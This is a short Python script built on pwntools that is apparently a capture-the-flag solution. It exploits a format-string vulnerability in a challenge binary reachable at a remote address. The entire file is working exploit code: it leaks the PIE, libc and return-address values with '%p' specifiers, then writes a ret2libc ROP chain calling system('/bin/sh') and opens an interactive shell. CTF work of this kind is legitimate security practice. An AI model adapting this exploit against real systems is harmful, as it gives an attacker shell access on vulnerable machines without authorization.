from pwn import *

elf = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

def exec_fmt(payload):
    p.sendlineafter(b'> ', payload) 
    p.recvuntil(b'You said: ', )
    leak = p.recvuntil(b'Exit?', drop=True)
    p.sendline(b'n')
    return leak

# p = process(stdout=PIPE)
p = remote("34.124.170.181", 11261)
# gdb.attach(p)

p.sendlineafter(b'> ', b'N')

fmtstr = FmtStr(execute_fmt=exec_fmt)

pie = int(exec_fmt(b"%87$p"), 16) - elf.symbols['main']
libc_base = int(exec_fmt(b"%85$p"), 16) - libc.symbols['__libc_start_call_main'] - 128
rip = int(exec_fmt(b"%89$p"), 16) - 912 + 640
print(hex(pie), hex(libc_base), hex(rip))

fmtstr.write(rip, libc_base+0x0000000000029139)
fmtstr.write(rip+8, libc_base+0x000000000002a3e5)
fmtstr.write(rip+16, libc_base+next(libc.search(b'/bin/sh')))
fmtstr.write(rip+24, libc_base+libc.symbols['system'])
context.log_level = 'debug'
fmtstr.execute_writes()
p.interactive()
